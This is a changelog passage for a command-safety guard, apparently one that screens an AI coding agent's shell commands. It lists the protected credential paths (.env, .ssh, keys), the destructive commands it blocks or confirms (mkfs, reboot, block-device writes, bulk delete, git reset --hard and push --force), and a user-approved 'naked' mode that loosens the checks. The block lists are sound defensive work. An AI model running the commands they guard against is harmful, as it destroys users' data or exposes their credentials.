- Adds `naked` mode: passes almost everything (protected paths, write/edit
  checks, git destructive, truncate, outside deletes/overwrites); only
  system-destructive Block-group commands (mkfs / reboot / block-device writes /
  bulk delete) are still confirmed. Switching to naked requires a double
  confirmation (stronger than trusted's single warning).

## [1.0.0] — initial release

- Protected-path interception (.env /.ssh / keys / credentials, regardless of
  project).
- Dangerous-command judgment: Block group (mkfs / reboot / block-device writes /
  bulk delete) and Confirm group (sudo / ssh / chmod 777 …); no-UI environments
  fall back to block.
- Prefix-command stripping (sudo/doas/pkexec/env/nohup/timeout/setsid/chroot/
  watch …) to analyze the real command; shell wrapper recursion (bash -c / eval,
  depth-limited); quote-aware tokenization; compound-command segmentation with
  fail-safe aggregation.
- realpath resolution (walk up to the nearest existing ancestor) so deep missing
  paths are not written through symlinks to outside the project; symlinked cwd
  resolved before judging.
- mv/cp/install/tee/ln -f/rsync existing-target overwrite detection;
  `> existing file` truncate detection (excluding append and devices);
  dd / curl -o / wget -O / unzip -o judgment.
- git destructive-command checks (clean -f / reset --hard / checkout --. /
  restore. / branch -D / push --force / stash drop), honoring -C/-c global
  option prefixes.
- Guard modes via `/guard`: strict / normal / loose / trusted; footer status bar
  shows the active mode.
